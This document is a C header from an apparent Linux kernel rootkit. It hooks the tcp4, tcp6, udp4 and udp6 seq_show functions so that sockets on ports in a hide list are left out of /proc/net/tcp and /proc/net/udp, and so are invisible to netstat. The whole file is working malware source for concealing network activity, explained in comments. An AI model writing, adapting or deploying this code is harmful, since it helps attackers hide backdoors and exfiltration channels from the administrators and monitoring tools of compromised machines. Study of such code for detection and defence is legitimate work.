#ifndef HIDE_PORTS_KITE
    #define HIDE_PORTS_KITE
    #include <net/tcp.h>
    #include <net/udp.h>

    #include "linked_list.h"

/* tcp4_seq_show is called to read from a sequence file, /proc/net/tcp and /proc/net/udp,
   sequence files are files that generates on the fly to present a large dataset(TCP Hash Tables, etc..), those specificaly are what ports are being used in the system,
   displayed by netstat. seq_file is a structure, like file_operations, enabling us to access the fields we want in the dataset.
   also passed is void *v , a pointer to an address containig a sock struct, representing a connection,
   the rest of the functions are for udp and ipv6 for tcp and udp, same implementation*/
static asmlinkage long hack_tcp4_seq_show(struct seq_file *seq, void *v){
    struct sock *sk;
    long ret;
    char port[6];

    if (v != SEQ_START_TOKEN){ // check that we are not at the start of the dataset containing the port table headers
        sk = (struct sock *)v;
        snprintf(port, 6, "%d", (int)sk->sk_num);

        if(find_node(&ports_to_hide, port) == 0){
            return 0;
        }
    }
    ret = orig_tcp4_seq_show(seq, v);
    return ret;
}


static asmlinkage long hack_tcp6_seq_show(struct seq_file *seq, void *v){
    struct sock *sk;
    long ret;
    char port[6];

    if (v != SEQ_START_TOKEN){
        sk = (struct sock *)v;
        snprintf(port, 6, "%d", (int)sk->sk_num);

        if(find_node(&ports_to_hide, port) == 0){
            return 0;
        }
    }
    ret = orig_tcp6_seq_show(seq, v);
    return ret;
}


static asmlinkage long hack_udp4_seq_show(struct seq_file *seq, void *v){
    struct sock *sk;
    long ret;
    char port[6];

    if (v != SEQ_START_TOKEN){
        sk = (struct sock *)v;
        snprintf(port, 6, "%d", (int)sk->sk_num);

        if(find_node(&ports_to_hide, port) == 0){
            return 0;
        }
    }
    ret = orig_udp4_seq_show(seq, v);
    return ret;
}


static asmlinkage long hack_udp6_seq_show(struct seq_file *seq, void *v){
    struct sock *sk;
    long ret;
    char port[6];

    if (v != SEQ_START_TOKEN){
        sk = (struct sock *)v;
        snprintf(port, 6, "%d", (int)sk->sk_num);

        if(find_node(&ports_to_hide, port) == 0){
            return 0;
        }
    }
    ret = orig_udp6_seq_show(seq, v);
    return ret;
}


#endif